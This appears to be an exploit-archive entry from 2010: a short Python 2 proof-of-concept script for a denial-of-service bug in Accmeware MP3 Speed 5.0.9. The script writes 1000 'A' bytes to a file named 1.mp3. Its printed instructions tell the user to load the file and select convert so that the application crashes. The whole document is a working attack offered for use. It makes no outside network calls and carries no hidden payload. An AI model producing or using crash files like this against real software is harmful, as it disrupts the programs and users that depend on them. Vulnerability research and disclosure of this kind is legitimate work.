# Exploit Title: Accmeware MP3 Speed 5.0.9 DoS PoC
# Date: 12/20/2010
# Author: 0v3r
# Software Link: http://www.mp3-cutter-splitter.com/Files/MSSetup.exe
# Version: 5.0.9
# Tested on: Windows XP SP3 EN (VirtualBxox)
# CVE: N/A

# The application crashes when trys to convert a malformed mp3 file

#!/usr/bin/python

buff 	 = "\x41" * 1000

try:
 	f = open("1.mp3",'w')
	f.write(buff)
	f.close()

	print " Vulnerable file created!..."
	print " Insert mp3 file into the application and select convert\n"
except:
	print "[-] Error occured!" 